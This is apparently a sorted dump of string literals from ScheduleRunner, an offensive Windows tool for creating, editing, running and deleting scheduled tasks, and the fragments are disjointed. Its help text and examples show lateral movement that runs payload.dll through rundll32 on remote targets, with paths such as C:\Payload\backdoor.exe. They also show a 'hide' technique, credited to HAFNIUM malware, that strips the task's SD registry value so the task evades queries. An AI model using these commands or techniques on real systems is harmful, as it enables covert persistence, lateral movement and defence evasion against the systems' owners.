"""                        "
"""                        (The deletion requires "
"""                        (This technique does not support remote execution due to privilege of remote registry. It requires "
"""    /argument         - Specify the command line argument for the program"
"""    /author           - Specify the author of the scheduled task"
"""    /description      - Specify the description for the scheduled task"
"""    /folder           - Specify the folder where the scheduled task stores (default: \)"
"""    /folder           - Specify the folder where the scheduled task stores"
"""    /modifier         - Specify how often the task runs within its schedule type. Applicable only for schedule type such as "
"""    /oldaction	      - Specify the old program that will be replaced with program"
"""    /order	          - Specify the index in actions in which the new program will be added (1-based)"
"""    /remoteserver     - Specify the hostname or IP address of a remote computer"
"""    /starttime        - Specify the start time for daily schedule type (e.g., 23:30)"
"""    /taskname         - Specify the name of the scheduled task"
"""    /technique        - Specify evasion technique:"
"""    /technique        - Specify when the scheduled task was created using evasion technique:"
"""    /trigger          - Specify the schedule type. The valid values include: "
"""    /user             - Run the task with a specified user account"
"""    ScheduleRunner.exe /method:create /taskname:Cleanup /trigger:daily /starttime:23:30 /program:calc.exe /description:"
"""    ScheduleRunner.exe /method:create /taskname:Cleanup /trigger:hourly /modifier:4 /program:rundll32.exe /argument:c:\temp\payload.dll /remoteserver:TARGET-PC01"
"""    ScheduleRunner.exe /method:delete /taskname:Cleanup /technique:hide"
"""    ScheduleRunner.exe /method:delete /taskname:Cleanup"
"""    ScheduleRunner.exe /method:edit /taskname:Cleanup /program:"
"""    ScheduleRunner.exe /method:move /taskname:Demo /remoteserver:TARGET-PC01 /program:rundll32.exe /argument:c:\temp\payload.dll /user:netero1010"
"""    ScheduleRunner.exe /method:query /folder:\Microsoft\Windows\CertificateServicesClient /remoteserver:TARGET-PC01"
"""    ScheduleRunner.exe /method:query /taskname:Cleanup /folder:\Microsoft\Windows\CertificateServicesClient /remoteserver:TARGET-PC01"
"""    ScheduleRunner.exe /method:queryfolders"
"""    ScheduleRunner.exe /method:run /taskname:Cleanup"
"""    [*] /program      - Specify the program that the task runs"
"""    [*] /remoteserver - Specify the hostname or IP address of a remote computer"
"""    [*] /taskname     - Specify the name of the scheduled task"
"""    [*] /trigger      - Specify the schedule type. The valid values include: "
"""    create        - Create a new scheduled task"
"""    delete        - Delete an existing scheduled task"
"""    edit          - Edit an existing scheduled task"
"""    move          - Perform lateral movement using scheduled task (automatically create, run and delete)"
"""    query         - Query details for a scheduled task or all scheduled tasks under a folder"
"""    queryfolders  - Query all sub-folders in scheduled task recursively"
"""    run           - Execute an existing scheduled task"
""" '$(Configuration)' == '' "
""" '$(Configuration)|$(Platform)' == 'Debug|AnyCPU' "
""" '$(Configuration)|$(Platform)' == 'Release|AnyCPU' "
""" '$(Platform)' == '' "
""" (e.g., 1-1439 minutes), "
""" (e.g., 1-23 hours) and "
""" + pathToDelete + "
""" + remoteServer + "
""" + taskName + "
""" + treeKey + taskName + "
""" /folder:\"
""" /oldaction:"
""" /remoteserver:"
""" BeforeTargets="
""" Condition="
""" Text="
""" \"
""" and "
""" and \"
""" developmentDependency="
""" encoding="
""" maxOccurs="
""" minOccurs="
""" must be defined when daily trigger is used. Please try again. For example, \"
""" must be defined. Please try again."
""" name="
""" or \"
""" parameter is incorrect. Please try again. For example, use \"
""" parameter."
""" sku="
""" targetFramework="
""" technique<br><br>[!] The deletion requires "
""" to repeat the task daily at 11:30pm."
""" to repeat the task every 4 hours."
""" to repeat the task every 60 minutes."
""" to repeat the task every Monday, Saturday and Sunday."
""" trigger already exists for the specified user. Please try again."
""" trigger already exists for the {td.Principal.UserId} user. Please try again."
""" triggers when editing a task. Please try again."
""" type="
""" under "
""" value from "
""" version="
""" xmlns="
""" xsi:noNamespaceSchemaLocation="
""" || args[0] == "
"""!Exists('..\packages\Costura.Fody.5.6.0\build\Costura.Fody.props')"
"""!Exists('..\packages\Costura.Fody.5.6.0\build\Costura.Fody.targets')"
"""!Exists('..\packages\Fody.6.5.3\build\Fody.targets')"
""""" (e.g., 1-1439 minutes), "
""""" (e.g., 1-23 hours) and "
""""" (e.g., mon,sat,sun)"
""""" + t.Folder + "
""""" + t.Name + "
""""" + tf.Path + "
""""" /argument:"
""""" /author:netero1010 /technique:hide"
""""" /author:netero1010"
""""" /oldaction:"
""""" /order:2"
""""" and "
""""" and the task will continue to run until system reboot even after task deletion)"
""""" as the second entry:"
""""" by changing its execution action to "
""""" folder on a remote server:"
""""" on a remote server:"
""""" technique"
""""" that used hiding scheduled task technique:"
""""" that will be executed every 4 hours on a remote server:"
""""" that will be executed every day at 11:30 p.m.:"
""""" to "
""""" under "
""""" using hiding scheduled task technique:"
""""" with argument "
""""" with multiple execution actions by inserting the new action "
""""" with multiple execution actions by replacing the old action "
""""""
""""", "
""""", and "
""""", and Task Scheduler"
"""""--exec ls"
"""""/method:query"
""""": A technique used by HAFNIUM malware that will hide the scheduled task from "
""""": Delete scheduled task that used "
""""":"
"""""C:\Payload\agent.exe"
"""""C:\Payload\backdoor.exe"
"""""C:\Windows\notepad.exe"
"""""Cleanup"
"""""NT AUTHORITY\SYSTEM"
"""""Some description"
"""""\Microsoft\Windows\CertificateServicesClient"
"""""daily"
"""""hide"
"""""hiding scheduled task"
"""""hourly"
"""""minute"
"""""onidle"
"""""onlogon"
"""""onstart"
"""""schtasks /query"
"""""weekly"
"""$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props"
"""$(MSBuildToolsPath)\Microsoft.CSharp.targets"
"""$([System.String]::Format('$(ErrorText)', '..\packages\Costura.Fody.5.6.0\build\Costura.Fody.props'))"
"""$([System.String]::Format('$(ErrorText)', '..\packages\Costura.Fody.5.6.0\build\Costura.Fody.targets'))"
"""$([System.String]::Format('$(ErrorText)', '..\packages\Fody.6.5.3\build\Fody.targets'))"
"""' file is in use by other process."
"""' is invalid."
"""'."
"""'..."
""") = "
""") == "
""", "
""", and "
"""----------------------------------------------------------------------"
"""-h"
"""-m 1"
""". Please try again. For example, use \"
"""."
"""..."
"""..\packages\Costura.Fody.5.6.0\build\Costura.Fody.props"
"""..\packages\Costura.Fody.5.6.0\build\Costura.Fody.targets"
"""..\packages\Fody.6.5.3\build\Fody.targets"
""".NETFramework,Version=v4.8"
"""/folder"
"""/h"
"""/help"
"""/modifier:4\"
"""/modifier:60\"
"""/modifier:\"
"""/modifier:mon,sat,sun to repeat the task every Monday, Saturday, and Sunday at 11:30pm."
"""/modifier:mon,sat,sun\"
"""/oldaction\"
"""/remoteserver"
"""/remoteserver, /taskname, /program\"
"""/starttime:23:30\"
"""/starttime:\"
"""/starttime\"
"""/taskname, /program, /trigger\"
"""/taskname, /program\"
"""/taskname\"
"""/technique"
"""/technique:hide"
"""/user"
"""0"
"""1"
"""1.0"
"""1.0.*"
"""1.0.0.0"
"""1.1.0"
"""1.6.1"
"""15.0"
"""2.9.2"
"""4.3.0"
"""5.6.0"
"""6.5.3"
"""80070534"
"""800706b5"
""": A technique used by HAFNIUM malware that will hide the scheduled task from task query<br><br>[!] https://www.microsoft.com/security/blog/2022/04/12/tarrask-malware-uses-scheduled-tasks-for-defense-evasion/<br>[!] This technique does not support remote execution due to privilege of remote registry. It requires "
""": Delete scheduled task that used "
"""================================================================================="
"""App.config"
"""C:\Windows\System32\Tasks\"
"""C:\Windows\System32\Tasks\\[task name]"
"""C:\Windows\notepad.exe"
"""Cleanup"
"""Command to check for sub folder details: ScheduleRunner.exe /method:query /folder:\"
"""Command to check for task details: ScheduleRunner.exe /method:query /taskname:\"
"""Costura"
"""Costura, Version=5.6.0.0, Culture=neutral, processorArchitecture=MSIL"
"""Costura.Fody"
"""Create a scheduled task called "
"""CreateTemporaryAssemblies"
"""Current"
"""Delete a scheduled task called "
"""DisableCleanup"
"""DisableCompression"
"""Edit a scheduled task called "
"""EnsureNuGetPackageBuildImports"
"""Example:"
"""ExcludeAssemblies"
"""ExcludeRuntimeAssemblies"
"""Execute a scheduled task called "
"""Exists('$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props')"
"""Exists('..\packages\Costura.Fody.5.6.0\build\Costura.Fody.props')"
"""Exists('..\packages\Costura.Fody.5.6.0\build\Costura.Fody.targets')"
"""Exists('..\packages\Fody.6.5.3\build\Fody.targets')"
"""Fody"
"""FodyWeavers.xsd"
"""GenerateXsd"
"""HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\\[task name]"
"""Helper.cs"
"""Id"
"""IgnoreSatelliteAssemblies"
"""IncludeAssemblies"
"""IncludeDebugSymbols"
"""IncludeRuntimeAssemblies"
"""IncludeRuntimeReferences"
"""LoadAtModuleInit"
"""Methods (/method):"
"""Microsoft.CSharp"
"""Microsoft.NETCore.Platforms"
"""Microsoft.Net.Framework.3.5.SP1"
"""Microsoft.Win32.TaskScheduler, Version=2.9.2.0, Culture=neutral, PublicKeyToken=e25603a88b3aa7da, processorArchitecture=MSIL"
"""NETStandard.Library"
"""NT AUTHOIRTY\SYSTEM"
"""NT AUTHORITY/SYSTEM"
"""NT AUTHORITY\SYSTEM"
"""NT AUTHORITY\\SYSTEM"
"""Options for editing a scheduled task (/method:edit):"
"""Options for scheduled task creation (/method:create):"
"""Options for scheduled task deletion (/method:delete):"
"""Options for scheduled task execution (/method:run):"
"""Options for scheduled task lateral movement (/method:move):"
"""Options for scheduled task query (/method:query):"
"""Perform lateral movement using scheduled task to a remote server using a specific user account:"
"""PreloadOrder"
"""PrepareForBuild"
"""Program.cs"
"""Properties\AssemblyInfo.cs"
"""Query all scheduled tasks under a specific folder "
"""Query all sub-folders in scheduled task:"
"""Query details for a scheduled task called "
"""SD"
"""SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tasks\"
"""SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\"
"""ScheduleRunner"
"""ScheduleRunner\ScheduleRunner.csproj"
"""Some description"
"""Sub folder name: "
"""System"
"""System.Collections"
"""System.Collections.Concurrent"
"""System.ComponentModel.Composition"
"""System.Core"
"""System.Data"
"""System.Data.DataSetExtensions"
"""System.Diagnostics.Debug"
"""System.Diagnostics.Tools"
"""System.Diagnostics.Tracing"
"""System.Drawing"
"""System.Globalization"
"""System.IO"
"""System.IO.Compression"
"""System.Linq"
"""System.Linq.Expressions"
"""System.Net.Http"
"""System.Net.Primitives"
"""System.Numerics"
"""System.ObjectModel"
"""System.Reflection"
"""System.Reflection.Extensions"
"""System.Reflection.Primitives"
"""System.Resources.ResourceManager"
"""System.Runtime"
"""System.Runtime.Extensions"
"""System.Runtime.InteropServices"
"""System.Runtime.InteropServices.RuntimeInformation"
"""System.Runtime.InteropServices.RuntimeInformation, Version=4.0.1.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a, processorArchitecture=MSIL"
"""System.Runtime.Numerics"
"""System.Text.Encoding"
"""System.Text.Encoding.Extensions"
"""System.Text.RegularExpressions"
"""System.Threading"
"""System.Threading.Tasks"
"""System.Xml"
"""System.Xml.Linq"
"""System.Xml.ReaderWriter"
"""System.Xml.XDocument"
"""Task XML: \n"
"""Task enabled: "
"""Task folder: "
"""Task full path: "
"""Task last run time: "
"""Task name: "
"""Task next run time: "
"""Task state: "
"""TaskManager.cs"
"""TaskScheduler"
"""Technique - hide:"
"""Unmanaged32Assemblies"
"""Unmanaged64Assemblies"
"""UseRuntimeReferencePaths"
"""VerifyAssembly"
"""VerifyIgnoreCodes"
"""Weavers"
"""[*] are mandatory fields."
"""[+] Connected to "
"""[+] Connecting to target server: "
"""[+] Creating the scheduled task: "
"""[+] Current folder: "
"""[+] Deleting the scheduled task: "
"""[+] Executing technique - hiding scheduled task..."
"""[+] Getting sub folders..."
"""[+] Listing all folders."
"""[+] Number of sub folder(s): "
"""[+] Number of task(s): "
"""[+] Removing 'SD' value from '"
"""[+] Removing scheduled task on disk artifact - '"
"""[+] Running the scheduled task: "
"""[+] The scheduled task is created."
"""[+] The scheduled task is deleted. However, The deleted scheduled task would continue to run according to the defined triggers until the system rebooted."
"""[+] The scheduled task is deleted."
"""[+] The scheduled task is hidden and invisible now."
"""[+] The scheduled task is started."
"""[-] Error: "
"""[-] Error: Access is denied."
"""[-] Error: Error when creating the scheduled task. Please check your parameters again."
"""[-] Error: Error when editing the scheduled task. Please check your parameters again."
"""[-] Error: Error when hiding the scheduled task."
"""[-] Error: Invalid order. '{order}' is not a valid integer."
"""[-] Error: Invalid order. Please enter a value between 1 and {actions + 1}."
"""[-] Error: Missing parameter. \"
"""[-] Error: Missing parameters. \"
"""[-] Error: No such schedule type. Please try again."
"""[-] Error: Only \"
"""[-] Error: Removing hidden scheduled task requires NT AUTHORITY\\SYSTEM."
"""[-] Error: Technique (hiding scheduled task) does not support remote server since 'Remote Registry' service is ran by Local Service only."
"""[-] Error: The '"
"""[-] Error: The \"
"""[-] Error: The folder does not exist."
"""[-] Error: The format of the \"
"""[-] Error: The interface is unknown. Probably the Schedule service is down?"
"""[-] Error: The modifier for hourly trigger should be lower than 24 hours. Please try again."
"""[-] Error: The modifier for minute trigger should be lower than 1439 minutes. Please try again."
"""[-] Error: The modifier is not defined. Please try again. For example, use \"
"""[-] Error: The network path was not found."
"""[-] Error: The path '"
"""[-] Error: The path ('"
"""[-] Error: The scheduled task cannot be deleted."
"""[-] Error: The scheduled task cannot be started."
"""[-] Error: The scheduled task does not exist."
"""[-] Error: The starttime is not defined. Please try again. For example, \"
"""[-] Error: The task has more than one exec actions. Please specify which one you would like to replace using  \"
"""[-] Error: The user name could not be found."
"""[-] Error: This folder cannot be found."
"""[-] Error: Unknown error while accessing remote server."
"""[-] Error: Unknown error while deleting the scheduled task on-disk artifact - '"
"""[-] Error: Unknown error while deleting the scheduled task."
"""[-] Error: Unknown error. The scheduled task was not created."
"""[-] Error: Unknown method."
"""[-] Error: Unkonwn error while checking the scheduled task via registry."
"""[-] Error: Unkonwn error while deleting the scheduled task."
"""[-] Error: Using technique (hiding scheduled task) requires NT AUTHORITY\\SYSTEM."
"""[-] Error: Wrong time format for \"
"""[-] Error: You do not have sufficient permission to create the scheduled task."
"""[-] Error: You do not have sufficient permission to edit the scheduled task."
"""[-] Error: You do not have sufficient permission to hide the scheduled task."
"""[-] Error: You do not have sufficient permission to remove the scheduled task."
"""[-] Error: You do not have sufficient permission to validate the existence of the scheduled task in registry."
"""[-] Error: Your task is not using hidden scheduled task technique. You should remove '/technique:hide' to properly delete the task."
"""[X] Your command is wrong. Please check help page."
"""\"
"""\Microsoft\Windows\CertificateServicesClient"
"""\\"
"""\r\n\r\n[+] Getting tasks..."
"""argument"
"""author"
"""create"
"""daily"
"""daily\"
"""delete"
"""description"
"""edit"
"""embed all Copy Local references"
"""ff5f7c4c-6915-4c53-9da3-b8be6c5f1db9"
"""folder"
"""fri"
"""friday"
"""help"
"""hide"
"""hiding scheduled task"
"""hourly"
"""http://schemas.microsoft.com/developer/msbuild/2003"
"""http://www.w3.org/2001/XMLSchema"
"""http://www.w3.org/2001/XMLSchema-instance"
"""kernel32.dll"
"""method"
"""minute"
"""modifier"
"""mon"
"""monday"
"""move"
"""net45"
"""oldaction"
"""onidle"
"""onlogon"
"""onlogon\"
"""onstart"
"""order"
"""packages.config"
"""program"
"""query"
"""queryfolders"
"""remoteserver"
"""run"
"""sat"
"""saturday"
"""starttime"
"""sun"
"""sunday"
"""taskname"
"""technique"
"""test"
"""thu"
"""thur"
"""thurs"
"""thursday"
"""trigger"
"""true"
"""tue"
"""tues"
"""tuesday"
"""user"
"""utf-8"
"""v4.0"
"""wed"
"""wednesday"
"""weekly"
"""x"
"""xs:boolean"
"""xs:string"
"""{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}"
"""{FF5F7C4C-6915-4C53-9DA3-B8BE6C5F1DB9}"
"""|                                                                               |"
"""|    _____      __             __      __     ____                              |"
"""|   / ___/_____/ /_  ___  ____/ /_  __/ /__  / __ \__  ______  ____  ___  _____ |"
"""|   \__ \/ ___/ __ \/ _ \/ __  / / / / / _ \/ /_/ / / / / __ \/ __ \/ _ \/ ___/ |"
"""|  Author: Chris Au                                                             |"
"""|  Github: @netero1010                                                          |"
"""|  ___/ / /__/ / / /  __/ /_/ / /_/ / /  __/ _, _/ /_/ / / / / / / /  __/ /     |"
"""| /____/\___/_/ /_/\___/\__,_/\__,_/_/\___/_/ |_|\__,_/_/ /_/_/ /_/\___/_/      |"
"""| Twitter: @netero_1010                                                         |"
"""| Version: 1.2                                                                  |"
